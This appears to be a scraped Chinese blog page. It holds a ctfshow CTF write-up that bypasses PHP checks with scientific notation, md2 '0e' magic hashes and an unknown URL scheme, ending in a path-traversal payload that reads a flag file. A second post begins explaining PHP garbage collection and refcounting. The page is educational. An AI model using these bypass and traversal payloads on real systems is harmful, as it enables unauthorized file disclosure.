    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><blockquote>
<p>php遇到不认识的协议就会当目录处理</p>
</blockquote>
<p>参考题目<a target="_blank" rel="noopener" href="https://ctf.show/challenges#web2_%E6%95%85%E4%BA%BA%E5%BF%83-482">ctfshow月饼杯故人心</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">7</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">**</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'差点点就成功了！'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>     
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'想一想md5碰撞原理吧?!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'第一个都过不了还想要flag呀?!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</code><br>a是数字，a的长度小于7，a不等于0，a的平方是0</p>
</blockquote>
<p>由于长度限制，这个时候利用到科学计数法找一个比较小的数例如<strong>1e-234</strong></p>
<blockquote>
<p><code>$d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</code><br>有个robots.txt文件</p>
<p><img src="https://img-blog.csdnimg.cn/e78bc410ddb4452f9a789038554b8fc3.png" alt="1"><br>只要保证一个数前面加上0e之后再md2仍然是0e开头的数字即可</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'024452'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$b = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'48399'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$c = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到结果<br><img src="https://img-blog.csdnimg.cn/24773c08bf7943759760909a91edf091.png" alt="2">b&#x3D;0e652024452&amp;c&#x3D;0e603448399</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'差点点就成功了！'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>filter_var函数：</p>
<blockquote>
<p>filter_var() 函数通过指定的过滤器过滤一个变量。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example....com"</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码的输出如下所示：</p>
<blockquote>
<p>E-mail is not valid </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c283211f432e4879a0d9d4b1c9c5f153.png" alt="1"><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-ref-filter.html">详情请见</a></p>
<p>php会将不认识的协议当成目录</p>
<blockquote>
<p>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;<br>打印Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F; )<br>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt<br>打印Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt ) ctfshow{91873400-0885-4a10-a7d9-75c9568f5e86} </p>
</blockquote>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-php的垃圾回收-GC-机制介绍以及在phar反序列化中的一些利用"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/"
    >php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/" class="article-date">
  <time datetime="2023-07-17T12:40:11.000Z" itemprop="datePublished">2023-07-17</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="php的垃圾回收-GC-机制介绍以及在phar反序列化中的一些利用"><a href="#php的垃圾回收-GC-机制介绍以及在phar反序列化中的一些利用" class="headerlink" title="php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用"></a>php的垃圾回收(GC)机制介绍以及在phar反序列化中的一些利用</h2><h2 id="析构函数-destruct"><a href="#析构函数-destruct" class="headerlink" title="析构函数__destruct()"></a>析构函数__destruct()</h2><p>当一个程序结束后php会自动销毁，最后再调用一次<code>__destruct()</code>。也就是说创建了一个对象的话，程序结束后就会被销毁，在结束时会调用一次以上<code>__destruct()</code>。如果要触发<code>__destruct()</code>的话，要么对象为<code>null</code>,要么php的生命周期结束，要么给定的变量被unset()销毁。那么如果程序还没有运行结束的话，在运行中抛出异常或者程序报错则不会触发<code>__destruct()</code>，这里就要提到GC回收机制。</p>
<h2 id="GC机制官方文档"><a href="#GC机制官方文档" class="headerlink" title="GC机制官方文档"></a>GC机制<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/features.gc.php">官方文档</a></h2><p>也就是垃圾回收机制，在php，python，java，c# 等中都有存在。</p>
<p>GC机制，能够销毁内存空间，防止内存溢出，在PHP中使用<strong>引用计数</strong>和<strong>回收周期</strong>来自动管理内存对象，当一个变量被设置为NULL或者没有指针指向时它就会变成垃圾被GC机制自动回收掉；当对象没有被引用时，也会被回收，在这个过程中，会自动调用对象中的<code>__destruct()</code>。</p>
<h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p>每一个php变量存在一个叫做zval的变量容器，一个zval变量容器包含变量的类型和值，还包括两个字节的额外信息—<code>is_ref</code>和<code>refcount</code>。</p>
<p><code>is_ref</code>是个bool值，用来标识变量是否是引用集合，通过这个字节，php引擎才可以把普通变量和引用变量区分开来。php它允许用户通过<code>&amp;</code>来自定义引用，并且zval变量容器中还有一个内部引用计数机制用来优化内存的使用。</p>
<p><code>refcount</code>表示有多少个变量名指向zval容器，也就是指向这个zval变量容器的变量个数。</p>
<p>我们可以使用xdebug来检查引用计数的情况<br> <img src="https://img-blog.csdnimg.cn/32b4413f344d4a71bbdaed0f95532c0b.png" alt="1"></p>
<p>引用例子：</p>
<p>在php5.6.9下运行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁$b,$c变量</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//引用变量</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在php5.6.9下运行得到结果</p>
<blockquote>
<p>a: (refcount&#x3D;3, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’&#x2F;&#x2F;b,b,c被销毁后就剩一个a指向zval容器a:(refcount&#x3D;2,isref&#x3D;1)&#x3D;′newstring′&#x2F;&#x2F;a指向zval容器a:(refcount&#x3D;2,isr​ef&#x3D;1)&#x3D;′newstring′&#x2F;&#x2F;b引用了a的地址，那么a的地址，那么b就是引用变量</p>
</blockquote>
<p>在php7.3.4下运行得到结果</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’&#x2F;&#x2F;b引用了b引用了a的地址，那么$b就是引用变量</p>
</blockquote>
<p>注意：</p>
<p>在php7开始，$c &#x3D; $b &#x3D; $a之后a的引用变量也是1。</p>
<p>在PHP 7中，zval可以被引用计数或不被引用，在zval结构中有一个标志确定了这一点。</p>
<p>①对于null，bool，int和double的类型变量，refcount不会计数；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'b'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'d'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcount值都为0</p>
</blockquote>
<p>php5.6.9运行结果</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcount值都为1</p>
</blockquote>
<p>②对于对象，refcount计数和php5的<strong>一致</strong>；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">sd</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘1’ }</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘1’ }</p>
<p>可以发现，两个refcount结果一样</p>
</blockquote>
<p>③对于字符串;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘new string’<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‘new string’</p>
</blockquote>
<p>④对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span><span class="token comment">//数组值改变以后，之前的引用全部废弃，重新计算</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4运行结果：</p>
<blockquote>
<p>c: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1  &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘c’)</p>
</blockquote>
<p>php5.6.9运行结果：</p>
<blockquote>
